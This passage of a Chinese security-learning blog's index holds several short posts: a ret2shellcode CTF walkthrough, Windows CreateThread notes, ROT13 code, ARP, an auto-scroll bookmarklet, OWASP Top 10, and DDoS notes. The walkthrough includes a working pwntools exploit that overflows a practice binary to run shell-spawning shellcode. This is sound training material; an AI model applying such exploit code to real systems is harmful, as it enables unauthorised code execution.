class="line">0x08048000 0x08049000 r-xp	&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0x08049000 0x0804a000 r-xp	&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0x0804a000 0x0804b000 rwxp	&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode</span><br><span class="line">0xf7ddb000 0xf7fb0000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb0000 0xf7fb1000 ---p	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb1000 0xf7fb3000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb3000 0xf7fb4000 rwxp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;libc-2.27.so</span><br><span class="line">0xf7fb4000 0xf7fb7000 rwxp	mapped</span><br><span class="line">0xf7fcf000 0xf7fd1000 rwxp	mapped</span><br><span class="line">0xf7fd1000 0xf7fd4000 r--p	[vvar]</span><br><span class="line">0xf7fd4000 0xf7fd6000 r-xp	[vdso]</span><br><span class="line">0xf7fd6000 0xf7ffc000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp	&#x2F;lib&#x2F;i386-linux-gnu&#x2F;ld-2.27.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp	[stack]</span><br></pre></td></tr></table></figure>

<p>通过 vmmap，我们可以看到 bss 段对应的段具有可执行权限</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0804a000 0x0804b000 rwxp	&#x2F;home&#x2F;seamiloak&#x2F;Desktop&#x2F;ret2shellcode</span><br></pre></td></tr></table></figure>

<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。</p>
<p>具体的 payload 如下</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#!&#x2F;usr&#x2F;bin&#x2F;env python</span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">sh &#x3D; process(&#39;.&#x2F;ret2shellcode&#39;)</span><br><span class="line">shellcode &#x3D; asm(shellcraft.sh())</span><br><span class="line">buf2_addr &#x3D; 0x804a080</span><br><span class="line"></span><br><span class="line">sh.sendline(shellcode.ljust(112, &#39;A&#39;) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>线程创建函数 CreateThread</title>
    <url>/2021/01/15/%E7%BA%BF%E7%A8%8B%E5%88%9B%E5%BB%BA%E5%87%BD%E6%95%B0%20CreateThread/</url>
    <content><![CDATA[<h2 id="创建步骤"><a href="#创建步骤" class="headerlink" title="创建步骤"></a>创建步骤</h2><p>CreateThread 将在主线程的基础上创建一个新线程，大致做如下步骤：<br>1.在内核对象中分配一个线程标识/句柄，可供管理，由CreateThread返回<br>2.把线程退出码置为STILL_ACTIVE，把线程挂起计数置1<br>3.分配context结构<br>4.分配两页的物理存储以准备栈，保护页设置为PAGE_READWRITE，第2页设为PAGE_GUARD<br>5.lpStartAddr和lpvThread值被放在栈顶，使它们成为传送给StartOfThread的参数<br>6.把context结构的栈指针指向栈顶（第5步）指令指针指向startOfThread函数</p>
<a id="more"></a>

<h2 id="函数原型"><a href="#函数原型" class="headerlink" title="函数原型"></a>函数原型</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">CreateThread(</span><br><span class="line">_In_opt_LPSECURITY_ATTRIBUTES lpThreadAttributes,</span><br><span class="line">_In_SIZE_T dwStackSize,</span><br><span class="line">_In_LPTHREAD_START_ROUTINE lpStartAddress,</span><br><span class="line">_In_opt___drv_aliasesMemLPVOID lpParameter,</span><br><span class="line">_In_DWORD dwCreationFlags,</span><br><span class="line">_Out_opt_LPDWORD lpThreadId</span><br><span class="line">);</span><br></pre></td></tr></table></figure>

<h2 id="参数说明"><a href="#参数说明" class="headerlink" title="参数说明"></a>参数说明</h2><ol>
<li><p><strong>lpThreadAttributes</strong>：指向SECURITY_ATTRIBUTES型态的结构的指针。在Windows 98中忽略该参数。在Windows NT中，NULL使用默认安全性，不可以被子线程继承，否则需要定义一个结构体将它的bInheritHandle成员初始化为TRUE</p>
</li>
<li><p><strong>dwStackSize</strong>：设置初始栈的大小，以字节为单位，如果为0，那么默认将使用与调用该函数的线程相同的栈空间大小。任何情况下，Windows根据需要动态延长堆栈的大小。</p>
</li>
<li><p><strong>lpStartAddress</strong>：指向线程函数的指针，形式：@函数名，函数名称没有限制，<br>线程有两种声明方式<br>（1）DWORD WINAPI 函数名 (LPVOID lpParam); //标准格式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">DWORD WINAPI 函数名 (LPVOID lpParam)</span><br><span class="line">&#123;</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CreateThread(NULL, 0, 函数名, 0, 0, 0);</span><br></pre></td></tr></table></figure>
<p>（2）void 函数名();<br>使用void 函数名()此种线程声明方式时，lpStartAddress需要加入LPTHREAD_START_ROUTINE转换，如</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">void 函数名()</span><br><span class="line">&#123;</span><br><span class="line">    return;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)函数名, 0, 0, 0);</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>lpParameter</strong>：向线程函数传递的参数，是一个指向结构的指针，不需传递参数时，为NULL。</p>
</li>
<li><p><strong>dwCreationFlags</strong>：线程标志,可取值如下<br>（1）CREATE_SUSPENDED(0x00000004)：创建一个挂起的线程，<br>（2）0：表示创建后立即激活。<br>（3）STACK_SIZE_PARAM_IS_A_RESERVATION(0x00010000)：dwStackSize参数指定初始的保留堆栈 的大小，否则,dwStackSize指定提交的大小。该标记值在Windows 2000/NT and Windows Me/98/95上不支持。</p>
</li>
<li><p><strong>lpThreadId</strong>：保存新线程的id。</p>
</li>
</ol>
<p>返回值：函数成功，返回线程句柄；函数失败返回false。若不想返回线程ID,设置值为NULL。</p>
<h2 id="示例"><a href="#示例" class="headerlink" title="示例"></a>示例</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI ThreadFunc(LPVOID);</span><br><span class="line">void ThreadFunc1();</span><br><span class="line"></span><br><span class="line">void main()</span><br><span class="line">&#123;</span><br><span class="line">	HANDLE hThread;</span><br><span class="line">	DWORD  threadId;</span><br><span class="line"></span><br><span class="line">	hThread &#x3D; CreateThread(NULL, 0, ThreadFunc, 0, 0, &amp;threadId); &#x2F;&#x2F; 创建线程</span><br><span class="line">	CreateThread(NULL, 0, ThreadFunc, 0, 0, &amp;threadId);</span><br><span class="line">	hThread &#x3D; CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadFunc1, 0, 0, &amp;threadId);</span><br><span class="line">	CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)ThreadFunc1, 0, 0, &amp;threadId);</span><br><span class="line">	printf(&quot;我是主线程， pid &#x3D; %d\n&quot;, GetCurrentThreadId());  &#x2F;&#x2F;输出主线程pid</span><br><span class="line">	Sleep(3000);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DWORD WINAPI ThreadFunc(LPVOID p)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;我是子线程1， pid &#x3D; %d\n&quot;, GetCurrentThreadId());   &#x2F;&#x2F;输出子线程pid</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">void ThreadFunc1()</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;我是子线程2， pid &#x3D; %d\n&quot;, GetCurrentThreadId());   &#x2F;&#x2F;输出子线程pid</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>输出如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">我是主线程， pid &#x3D; 10908</span><br><span class="line">我是子线程1， pid &#x3D; 11776</span><br><span class="line">我是子线程1， pid &#x3D; 13092</span><br><span class="line">我是子线程2， pid &#x3D; 13324</span><br><span class="line">我是子线程2， pid &#x3D; 12360</span><br></pre></td></tr></table></figure>]]></content>
  </entry>
  <entry>
    <title>rot13 算法</title>
    <url>/2021/01/16/rot13%E7%AE%97%E6%B3%95/</url>
    <content><![CDATA[<h2 id="密码描述"><a href="#密码描述" class="headerlink" title="密码描述"></a>密码描述</h2><p>套用 ROT13 到一段文字上仅仅只需要检查字元字母顺序并取代它在 13 位之后的对应字母，有需要超过时则重新绕回 26 英文字母开头即可。A 换成 N、B 换成 O、依此类推到 M 换成 Z，然后序列反转：N 换成 A、O 换成 B、最后 Z 换成 M。只有这些出现在英文字母里头的字元受影响；数字、符号、空白字元以及所有其他字元都不变。因为只有在英文字母表里头只有 26 个，并且 26=2×13，ROT13 函数是它自己的逆反：</p>
<p>对任何字元 x：<code>ROT13(ROT13(x))=ROT26(x)=x。</code><br>换句话说，两个连续的 ROT13 应用函式会回复原始文字（在数学上，这有时称之为对合（involution）；在密码学上，这叫做对等加密（reciprocalcipher））。</p>
<h2 id="python实现"><a href="#python实现" class="headerlink" title="python实现"></a>python 实现</h2><figure class="highlight plaintext"><table><tbody><tr><td class="code"><pre><span class="line">def rot13(i):</span><br><span class="line">    cipher = ''</span><br><span class="line">    if i.isupper():</span><br><span class="line">        if 90 &gt;= ord(i) + 13:</span><br><span class="line">            cipher += chr((ord(i) + 13 - 65) % 26 + 65)</span><br><span class="line">        else:</span><br><span class="line">            cipher += chr((ord(i) - 13 - 65) % 26 + 65)</span><br><span class="line">    elif i.islower():</span><br><span class="line">        if 122 &gt;= ord(i) + 13:</span><br><span class="line">            cipher += chr((ord(i) + 13 - 97) % 26 + 97)</span><br><span class="line">        else:</span><br><span class="line">            cipher += chr((ord(i) - 13 - 97) % 26 + 97)</span><br><span class="line">    else:</span><br><span class="line">        cipher += i</span><br><span class="line">    return cipher</span><br></pre></td></tr></tbody></table></figure>]]></content>
      <categories>
        <category>密码学</category>
      </categories>
  </entry>
  <entry>
    <title>ARP协议</title>
    <url>/2022/05/13/ARP%E5%8D%8F%E8%AE%AE/</url>
    <content><![CDATA[<h1 id="ARP协议与ARP欺骗"><a href="#ARP协议与ARP欺骗" class="headerlink" title="ARP协议与ARP欺骗"></a>ARP协议与ARP欺骗</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>地址解析协议，即ARP（Address Resolution Protocol），是根据IP地址获取物理地址的一个TCP/IP协议。  </p>
<h2 id="过程"><a href="#过程" class="headerlink" title="过程"></a>过程</h2><p>主机A的IP地址为192.168.1.1，MAC地址为0A-11-22-33-44-01；<br>主机B的IP地址为192.168.1.2，MAC地址为0A-11-22-33-44-02；<br>当主机A要与主机B通信时，地址解析协议可以将主机B的IP地址（192.168.1.2）解析成主机B的MAC地址，以下为工作流程：<br>第1步：根据主机A上的路由表内容，IP确定用于访问主机B的转发IP地址是192.168.1.2。然后A主机在自己的本地ARP缓存中检查主机B的匹配MAC地址。<br>第2步：如果主机A在ARP缓存中没有找到映射，它将询问192.168.1.2的硬件地址，从而将ARP请求帧广播到本地网络上的所有主机。源主机A的IP地址和MAC地址都包括在ARP请求中。本地网络上的每台主机都接收到ARP请求并且检查是否与自己的IP地址匹配。如果主机发现请求的IP地址与自己的IP地址不匹配，它将丢弃ARP请求。<br>第3步：主机B确定ARP请求中的IP地址与自己的IP地址匹配，则将主机A的IP地址和MAC地址映射添加到本地ARP缓存中。<br>第4步：主机B将包含其MAC地址的ARP回复消息直接发送回主机A。<br>第5步：当主机A收到从主机B发来的ARP回复消息时，会用主机B的IP和MAC地址映射更新ARP缓存。本机缓存是有生存期的，生存期结束后，将再次重复上面的过程。主机B的MAC地址一旦确定，主机A就能向主机B发送IP通信了。</p>
]]></content>
  </entry>
  <entry>
    <title>JavaScript 网页自动滚动</title>
    <url>/2022/05/13/JavaScript%E7%BD%91%E9%A1%B5%E8%87%AA%E5%8A%A8%E6%BB%9A%E5%8A%A8/</url>
    <content><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>由于本人日常爱好练吉他，频繁在网页中查找吉他谱，苦于一边弹琴一边翻页，遂想可否通过 JavaScript 脚本添加到网页收藏夹中，实现网页自动滚动，解放右手，芜湖～</p>
<h1 id="设计"><a href="#设计" class="headerlink" title="设计"></a>设计</h1><p>此段脚本的功能为自动滚动网页，监听键盘的 “+”、 “-”、 “Enter”、 “Escape”, 实现加速，减速，开始，暂停。</p>
<p>浏览器收藏夹可以运行 JavaScript 代码是我们能一键启动的重要原因。</p>
<p>主要函数如下</p>
<figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">scroll</span>(x-coord,y-coord ) <span class="comment">//实现翻页</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">scroll</span>(<span class="number">0</span>, ++currentTop)  <span class="comment">// 其中currentTop不断增大实现一次滚动</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">setInterval</span>(code,millisec[,<span class="string">"lang"</span>]) <span class="comment">//使代码不断运行，不断滚动，调整millisec以调整滚动速度</span></span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>() <span class="comment">//监听键盘事件，实现加速减速开始暂停</span></span><br></pre></td></tr></tbody></table></figure>

<h1 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h1><figure class="highlight javascript"><table><tbody><tr><td class="code"><pre><span class="line"><span class="keyword">let</span> currentTop = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span>; <span class="comment">//设置当前页面的页面顶端</span></span><br><span class="line"><span class="keyword">let</span> speed = <span class="number">200</span>; <span class="comment">//速度</span></span><br><span class="line"><span class="keyword">var</span> time = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">AutoScroll</span>(<span class="params"></span>) {</span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">scroll</span>(<span class="number">0</span>, ++currentTop);</span><br><span class="line">}</span><br><span class="line"></span><br><span class="line"><span class="comment">//在滚动鼠标后重新赋值滚动后页面的顶端，以防需要使用鼠标调整位置的情况</span></span><br><span class="line"><span class="variable language_">window</span>.<span class="property">onscroll</span> = <span class="keyword">function</span> (<span class="params"></span>) {</span><br><span class="line">    currentTop = <span class="variable language_">document</span>.<span class="property">documentElement</span>.<span class="property">scrollTop</span>;</span><br><span class="line">};</span><br><span class="line"></span><br><span class="line"><span class="variable language_">window</span>.<span class="title function_">addEventListener</span>(</span><br><span class="line">    <span class="string">"keydown"</span>,</span><br><span class="line">    <span class="keyword">function</span> (<span class="params">event</span>) {</span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">defaultPrevented</span>) {</span><br><span class="line">            <span class="keyword">return</span>; <span class="comment">// Should do nothing if the default action has been cancelled</span></span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> handled = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (event.<span class="property">key</span> !== <span class="literal">undefined</span>) {</span><br><span class="line">            <span class="comment">// Handle the event with KeyboardEvent.key and set handled true.</span></span><br><span class="line">            <span class="keyword">switch</span> (event.<span class="property">key</span>) {</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"Enter"</span>:</span><br><span class="line">                    <span class="built_in">clearInterval</span>(time);</span><br><span class="line">                    time = <span class="built_in">setInterval</span>(<span class="title class_">AutoScroll</span>, speed);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"start"</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"Escape"</span>:</span><br><span class="line">                    <span class="built_in">clearInterval</span>(time);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"stop"</span>);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"+"</span>:</span><br><span class="line">                    speed /= <span class="number">2</span>;</span><br><span class="line">                    <span class="built_in">clearInterval</span>(time);</span><br><span class="line">                    time = <span class="built_in">setInterval</span>(<span class="title class_">AutoScroll</span>, speed);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"speed:"</span> + speed);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">"-"</span>:</span><br><span class="line">                    speed *= <span class="number">2</span>;</span><br><span class="line">                    <span class="built_in">clearInterval</span>(time);</span><br><span class="line">                    time = <span class="built_in">setInterval</span>(<span class="title class_">AutoScroll</span>, speed);</span><br><span class="line">                    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">"speed:"</span> + speed);</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            handled = <span class="literal">true</span>;</span><br><span class="line">        } <span class="keyword">else</span> <span class="keyword">if</span> (event.<span class="property">keyCode</span> !== <span class="literal">undefined</span>) {</span><br><span class="line">            <span class="comment">// Handle the event with KeyboardEvent.keyCode and set handled true.</span></span><br><span class="line">            <span class="keyword">switch</span> (event.<span class="property">key</span>) {</span><br><span class="line">                <span class="keyword">case</span> <span class="number">108</span>:</span><br><span class="line">                    <span class="built_in">setInterval</span>(<span class="title class_">AutoScroll</span>, speed);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">27</span>:</span><br><span class="line">                    <span class="built_in">clearInterval</span>(time);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">107</span>:</span><br><span class="line">                    <span class="keyword">if</span> (speed &gt; <span class="number">0</span>) {</span><br><span class="line">                        speed /= <span class="number">2</span>;</span><br><span class="line">                        <span class="built_in">clearInterval</span>(time);</span><br><span class="line">                        time = <span class="built_in">setInterval</span>(<span class="title class_">AutoScroll</span>, speed);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(speed);</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">109</span>:</span><br><span class="line">                    {</span><br><span class="line">                        speed *= <span class="number">2</span>;</span><br><span class="line">                        <span class="built_in">clearInterval</span>(time);</span><br><span class="line">                        time = <span class="built_in">setInterval</span>(<span class="title class_">AutoScroll</span>, speed);</span><br><span class="line">                        <span class="variable language_">console</span>.<span class="title function_">log</span>(speed);</span><br><span class="line">                    }</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            }</span><br><span class="line">            handled = <span class="literal">true</span>;</span><br><span class="line">        }</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (handled) {</span><br><span class="line">            <span class="comment">// Suppress "double action" if event handled</span></span><br><span class="line">            event.<span class="title function_">preventDefault</span>();</span><br><span class="line">        }</span><br><span class="line">    },</span><br><span class="line">    <span class="literal">true</span></span><br><span class="line">);</span><br></pre></td></tr></tbody></table></figure>
<h1 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h1><p>最后随便找个网页添加到收藏夹，编辑这个收藏夹网页，更改 URL 即可以实现一键解放右手。	</p>
]]></content>
      <categories>
        <category>JavaScript</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>吉他</tag>
      </tags>
  </entry>
  <entry>
    <title>OWASP TOP 10</title>
    <url>/2022/05/26/%E5%B8%B8%E8%A7%81web%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<h1 id="漏洞危险性排名"><a href="#漏洞危险性排名" class="headerlink" title="漏洞危险性排名"></a>漏洞危险性排名</h1><p>常见的 Web 漏洞有十个，称为 OWASP TOP 10<br>（注：2021 年排名已经更改，获取更详细的排名请跳转 <a href="https://owasp.org/Top10/%EF%BC%89">https://owasp.org/Top10/）</a><br>TOP1 - 注入<br>TOP2 - 失效的身份认证和会话管理（破损认证）<br>TOP3-XSS (跨站脚本攻击)<br>TOP4 - 不安全的对象直接引用<br>TOP5 - 跨站请求伪造（CSRF）<br>TOP6 - 安全配置错误<br>TOP7 - 限制 URL 访问失败（缺少功能级访问控制）<br>TOP8 - 未验证的重定向和转发<br>TOP9 - 应用已知漏洞的组件<br>TOP10 - 敏感信息暴露</p>
<h1 id="详细介绍"><a href="#详细介绍" class="headerlink" title="详细介绍"></a>详细介绍</h1><p>TOP1 - 注入：注入攻击漏洞，例如 SQL，OS 以及 LDAP 注入。这些攻击发生在当不可信的数据作为命令或者查询语句的一部分，被发送给解释器的时候。攻击者发送的恶意数据可以欺骗解释器，以执行计划外的命令或者在未被恰当授权时访问数据。</p>
<p>TOP2 - 失效的身份认证和会话管理：与身份认证和会话管理相关的应用程序功能往往得不到正确的实现，这就导致了攻击者破坏密码、密匙、会话令牌或攻击其他的漏洞去冒充其他用户的身份。</p>
<p>TOP3 - 跨站脚本：当应用程序收到含有不可信的数据，在没有进行适当的验证和转义的情况下，就将它发送给一个网页浏览器，这就会产生跨站脚本攻击（简称 XSS）。XSS 允许攻击者在受害者的浏览器上执行脚本，从而劫持用户会话、危害网站、或者将用户转向至恶意网站。</p>
<p>TOP4 - 不安全的直接对象引用：当开发人员暴露一个对内部实现对象的引用时，例如，一个文件、目录或者数据库密匙，就会产生一个不安全的直接对象引用。在没有访问控制检测或其他保护时，攻击者会操控这些引用去访问未授权数据。</p>
<p>TOP5 - 跨站请求伪造：一个跨站请求伪造攻击迫使登录用户的浏览器将伪造的 HTTP 请求，包括该用户的会话 cookie 和其他认证信息，发送到一个存在漏洞的 web 应用程序。这就允许了攻击者迫使用户浏览器向存在漏洞的应用程序发送请求，而这些请求会被应用程序认为是用户的合法请求。</p>
<p>TOP6 - 安全配置错误：好的安全需要对应用程序、框架、应用程序服务器、web 服务器、数据库服务器和平台定义和执行安全配置。由于许多设置的默认值并不是安全的，因此，必须定义、实施和维护这些设置。这包含了对所有的软件保持及时地更新，包括所有应用程序的库文件。</p>
<p>TOP7 - 功能级访问控制缺失：大多数 Web 应用程序在功能在 UI 中可见以前，验证功能级别的访问权限。但是，应用程序需要在每个功能被访问时在服务器端执行相同的访问控制检查。如果请求没有被验证，攻击者能够伪造请求以在未经适当授权时访问功能。</p>
<p>TOP8 - 未验证的重定向和转发：Web 应用程序经常将用户重定向和转发到其他网页和网站，并且利用不可信的数据去判定目的页面。如果没有得到适当验证，攻击者可以重定向受害用户到钓鱼软件或恶意网站，或者使用转发去访问未授权的页面。</p>
<p>TOP9 - 使用含有已知漏洞的组件：组件，比如：库文件、框架和其它软件模块，几乎总是以全部的权限运行。如果一个带有漏洞的组件被利用，这种攻击可以造成更为严重的数据丢失或服务器接管。应用程序使用带有已知漏洞的组件会破坏应用程序防御系统，并使一系列可能的攻击和影响成为可能。</p>
<p>TOP10 - 敏感信息泄漏：许多 Web 应用程序没有正确保护敏感数据，如信用卡，税务 ID 和身份验证凭据。攻击者可能会窃取或篡改这些弱保护的数据以进行信用卡诈骗、身份窃取，或其他犯罪。敏感数据值需额外的保护，比如在存放或在传输过程中的加密，以及在与浏览器交换时进行特殊的预防措施。</p>
]]></content>
      <categories>
        <category>常见漏洞</category>
      </categories>
      <tags>
        <tag>Web漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>常见二进制漏洞</title>
    <url>/2022/06/10/%E5%B8%B8%E8%A7%81%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E/</url>
    <content><![CDATA[<p>0x01 栈溢出漏洞原理<br>0x02 堆溢出漏洞原理<br>0x03 整数溢出漏洞原理<br>    基于栈的整数溢出<br>    基于堆的整数溢出<br>0x04 格式化字符串漏洞原理<br>0x05 双重释放漏洞原理<br>0x06 释放后重引用漏洞原理<br>0x07 数组越界访问漏洞<br>0x08 类型混淆漏洞原理<br>0x09 竞争条件漏洞原理</p>
]]></content>
      <categories>
        <category>常见漏洞</category>
      </categories>
      <tags>
        <tag>二进制漏洞</tag>
      </tags>
  </entry>
  <entry>
    <title>DDOS 攻击与 CC 攻击</title>
    <url>/2022/06/21/DDOS%E4%B8%8ECC%E6%94%BB%E5%87%BB/</url>
    <content><![CDATA[<h1 id="DDOS攻击"><a href="#DDOS攻击" class="headerlink" title="DDOS攻击"></a>DDOS 攻击</h1><p>DDOS 攻击（分布式拒绝服务攻击），攻击者利用傀儡机对目标网址在较短时间发起大量请求，消耗目标网站的服务器资源，无法正常进行服务。</p>
<h2 id="DDOS特点"><a href="#DDOS特点" class="headerlink" title="DDOS特点"></a>DDOS 特点</h2><p>攻击网络层，传输层，应用层<br>利用肉鸡（傀儡机）<br>针对 IP 的攻击，流量攻击</p>
<h1 id="CC攻击"><a href="#CC攻击" class="headerlink" title="CC攻击"></a>CC 攻击</h1><p>CC 攻击是 DDOS 是一种，攻击需要大量数据操作的页面（如搜索，留言等）</p>
<h2 id="CC攻击特点"><a href="#CC攻击特点" class="headerlink" title="CC攻击特点"></a>CC 攻击特点</h2><p>应用层攻击<br>攻击目标主要是网页<br>持续时间长<br>没有真实源 IP<br>没有特别大的异常流量</p>
]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>web安全</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP5.5 ~ PHP7.2 特性总结</title>
    <url>/2022/07/02/PHP5.5%20~%20PHP7.2%20%E7%89%B9%E6%80%A7%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="从PHP-5-5-x-移植到-PHP-5-6-x"><a href="#从PHP-5-5-x-移植到-PHP-5-6-x" class="headerlink" title="从PHP 5.5.x 移植到 PHP 5.6.x"></a>从 PHP 5.5.x 移植到 PHP 5.6.x</h1><h2 id="使用表达式定义常量"><a href="#使用表达式定义常量" class="headerlink" title="使用表达式定义常量"></a>使用表达式定义常量</h2><h2 id="使用-…-运算符定义变长参数函数"><a href="#使用-…-运算符定义变长参数函数" class="headerlink" title="使用 … 运算符定义变长参数函数"></a>使用 … 运算符定义变长参数函数</h2><h2 id="使用-…-运算符进行参数展开"><a href="#使用-…-运算符进行参数展开" class="headerlink" title="使用 … 运算符进行参数展开"></a>使用 … 运算符进行参数展开</h2><h2 id="use-function-以及-use-const"><a href="#use-function-以及-use-const" class="headerlink" title="use function 以及 use const"></a>use function 以及 use const</h2><h2 id="使用-hash-equals-比较字符串避免时序攻击"><a href="#使用-hash-equals-比较字符串避免时序攻击" class="headerlink" title="使用 hash_equals() 比较字符串避免时序攻击"></a>使用 hash_equals () 比较字符串避免时序攻击</h2><h1 id="从PHP-5-6-x-移植到-PHP-7-0-x"><a href="#从PHP-5-6-x-移植到-PHP-7-0-x" class="headerlink" title="从PHP 5.6.x 移植到 PHP 7.0.x"></a>从 PHP 5.6.x 移植到 PHP 7.0.x</h1><h2 id="标量类型声明"><a href="#标量类型声明" class="headerlink" title="标量类型声明"></a>标量类型声明</h2><h2 id="返回值类型声明"><a href="#返回值类型声明" class="headerlink" title="返回值类型声明"></a>返回值类型声明</h2><h2 id="null合并运算符"><a href="#null合并运算符" class="headerlink" title="null合并运算符"></a>null 合并运算符</h2><h2 id="太空船操作符（组合比较符）"><a href="#太空船操作符（组合比较符）" class="headerlink" title="太空船操作符（组合比较符）"></a>太空船操作符（组合比较符）</h2><h2 id="通过-define-定义常量数组"><a href="#通过-define-定义常量数组" class="headerlink" title="通过 define() 定义常量数组"></a>通过 define () 定义常量数组</h2><h2 id="Closure-call"><a href="#Closure-call" class="headerlink" title="Closure::call()"></a>Closure::call()</h2><h2 id="分组-use-声明"><a href="#分组-use-声明" class="headerlink" title="分组 use 声明"></a>分组 use 声明</h2><h2 id="生成器可以返回表达式"><a href="#生成器可以返回表达式" class="headerlink" title="生成器可以返回表达式"></a>生成器可以返回表达式</h2><h2 id="整数除法函数-intdiv"><a href="#整数除法函数-intdiv" class="headerlink" title="整数除法函数 intdiv()"></a>整数除法函数 intdiv ()</h2><h1 id="从PHP-7-0-x-移植到-PHP-7-1-x"><a href="#从PHP-7-0-x-移植到-PHP-7-1-x" class="headerlink" title="从PHP 7.0.x 移植到 PHP 7.1.x"></a>从 PHP 7.0.x 移植到 PHP 7.1.x</h1><h2 id="可为空（Nullable）类型"><a href="#可为空（Nullable）类型" class="headerlink" title="可为空（Nullable）类型"></a>可为空（Nullable）类型</h2><h2 id="Void-函数"><a href="#Void-函数" class="headerlink" title="Void 函数"></a>Void 函数</h2><h2 id="Symmetric-array-destructuring"><a href="#Symmetric-array-destructuring" class="headerlink" title="Symmetric array destructuring"></a>Symmetric array destructuring</h2><h2 id="类常量可见性"><a href="#类常量可见性" class="headerlink" title="类常量可见性"></a>类常量可见性</h2><h2 id="iterable-伪类"><a href="#iterable-伪类" class="headerlink" title="iterable 伪类"></a>iterable 伪类</h2><h2 id="多异常捕获处理"><a href="#多异常捕获处理" class="headerlink" title="多异常捕获处理"></a>多异常捕获处理</h2><h2 id="list-现在支持键名"><a href="#list-现在支持键名" class="headerlink" title="list()现在支持键名"></a>list () 